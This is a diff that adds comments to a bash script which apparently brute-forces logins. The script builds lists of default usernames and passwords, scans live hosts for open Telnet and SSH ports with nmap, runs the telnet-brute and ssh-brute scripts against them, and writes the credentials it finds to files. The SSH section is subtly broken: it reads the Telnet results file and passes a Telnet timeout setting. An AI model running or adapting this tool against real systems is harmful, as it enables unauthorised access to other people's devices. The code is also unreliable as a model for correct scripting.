@@ -48,7 +48,7 @@ case $opt in
 	touch user.txt; echo admin >> user.txt; echo root >> user.txt; echo ubnt >> user.txt; echo support >> user.txt; echo service >> user.txt; echo guest >> user.txt; echo root >> user.txt 
 	touch pass.txt; echo admin >> pass.txt; echo root >> pass.txt; echo password >> pass.txt; echo guest >> pass.txt; echo service >> pass.txt; echo guest >> pass.txt; echo toor >> pass.txt
 
-	open=$(nmap -iL lips.txt -p 23 | grep -E 'open' | awk '{print $2}' | wc | awk '{print $1}')
+	open=$(nmap -iL lips.txt -p 23 | grep -E 'open' | awk '{print $2}' | wc | awk '{print $1}') # Finds which live IPs have port 23 (Telnet) open.
 
 	ips=$(cat 'lips.txt')
 
@@ -62,17 +62,17 @@ case $opt in
 
 		if [[ $test = 'open' ]]; then	
 
-												
+				# Runs Nmap bruteforce script on IPs with port 23 open.								
 				var=$(nmap -oX Telnet-Credentials.xml -p 23 --script telnet-brute --script-args userdb=user.txt,passdb=pass.txt,telnet-brute.timeout=8s "$ip" | grep -E 'Valid' | awk '{print $4}')
 
-				user=($(grep -o -P '(?<=username">).*(?=</elem>)' Telnet-Credentials.xml))
-				pass=($(grep -o -P '(?<=password">).*(?=</elem>)' Telnet-Credentials.xml))	
+				user=($(grep -o -P '(?<=username">).*(?=</elem>)' Telnet-Credentials.xml)) # Pulls the username out of the results.
+				pass=($(grep -o -P '(?<=password">).*(?=</elem>)' Telnet-Credentials.xml)) # Pulls the password out of the results.	
 
 			if [[ $var = *Valid* ]]; then
 
-				echo "The telnet credentials for $ip are:" >> Telnet-Credentials.txt
+				echo "The telnet credentials for $ip are:" >> Telnet-Credentials.txt 
 
-				for i in "${!user[@]}"; do
+				for i in "${!user[@]}"; do # Takes the index of $user and prints out seqentially $user & $pass
 
 				printf "%s : %s\n\n" "${user[i]}" "${pass[i]}" >> Telnet-Credentials.txt
 				
@@ -84,7 +84,7 @@ case $opt in
 	done
 
 
-	open=$(nmap -iL lips.txt -p 22 | grep -E 'open' | awk '{print $2}' | wc | awk '{print $1}')
+	open=$(nmap -iL lips.txt -p 22 | grep -E 'open' | awk '{print $2}' | wc | awk '{print $1}') # Finds which live IPs have port 22 (SSH) open.
 
 	for ip in $ips;  do
 
@@ -94,17 +94,17 @@ case $opt in
 		if [[ $test = 'open' ]]; then	
 
 		
-												
+				# Runs Nmap bruteforce script on IPs with port 22 open.								
 				var=$(nmap -oX SSH-Credentials.xml -p 22 --script ssh-brute --script-args userdb=user.txt,passdb=pass.txt,telnet-brute.timeout=8s "$ip" | grep -E 'Valid' | awk '{print $4}')
 
-				user=($(grep -o -P '(?<=username">).*(?=</elem>)' Telnet-Credentials.xml))
-				pass=($(grep -o -P '(?<=password">).*(?=</elem>)' Telnet-Credentials.xml))
+				user=($(grep -o -P '(?<=username">).*(?=</elem>)' Telnet-Credentials.xml)) # Pulls the username out of the results.
+				pass=($(grep -o -P '(?<=password">).*(?=</elem>)' Telnet-Credentials.xml)) # Pulls the password out of the results.
 
 				if [[ $var = *Valid* ]]; then
 						
 				echo "The SSH credentials for $ip are:" >> SSH-Credentials.txt
 
-				for i in "${!user[@]}"; do
+				for i in "${!user[@]}"; do # Takes the index of $user and prints out seqentially $user & $pass
 
 				printf "%s : %s\n\n" "${user[i]}" "${pass[i]}" >> SSH-Credentials.txt
 
@@ -118,7 +118,7 @@ case $opt in
 
 	done
 
-	if [ "$(find ./ -type f -name "*-Credentials.txt" | wc -l)" -ge 1 ];
+	if [ "$(find ./ -type f -name "*-Credentials.txt" | wc -l)" -ge 1 ]; # Checks if the credentials files have one or more rows.
 		then
 
 		#clear
